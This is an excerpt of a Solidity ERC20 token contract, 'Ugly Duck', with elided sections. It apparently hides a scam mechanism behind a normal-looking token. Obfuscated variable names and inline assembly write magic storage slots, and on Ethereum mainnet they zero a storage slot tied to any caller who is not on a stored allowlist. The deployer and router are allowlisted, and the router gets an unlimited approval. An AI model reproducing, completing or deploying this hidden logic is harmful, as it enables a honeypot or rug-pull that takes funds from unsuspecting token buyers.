...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addOriginal;
    uint256 private _redHotChili = block.number*2;

    mapping (address => bool) private _freshFruit; 
    mapping (address => bool) private _oldBread;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private beerParty;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private skyLord;
    address public pair;
    ...
    bool private trading; uint256 private hondaKia = 1; bool private teslaMotor;
    uint256 private _decimals; uint256 private flameKeeper;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addOriginal.push(_router); addOriginal.push(msgSender_); addOriginal.push(pair);
        for (uint256 q=0; q < 3;) {_freshFruit[addOriginal[q]] = true; unchecked{q++;} }
    }
    ...
    function _InitToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x6ec9ead78e8200c5ae559a6edc2fca6587ae23e2a18fe3dcb38edb01d03df678
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xda9dd1c9f1a529b80a7b8c4e379a017e358c96a398fa27b4be9095f6c3cd06b9,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _redHotChili = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addOriginal[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployOriginal(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addOriginal[0], 10 ** 77);
        _InitToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployOriginal(creator, initialSupply);
    }
}

contract UglyDuck is ERC20Token {
    constructor() ERC20Token("Ugly Duck", "D\xF0\x9F\x90\xA3CK", msg.sender, 100000000 * 10 ** 18) {
    }
}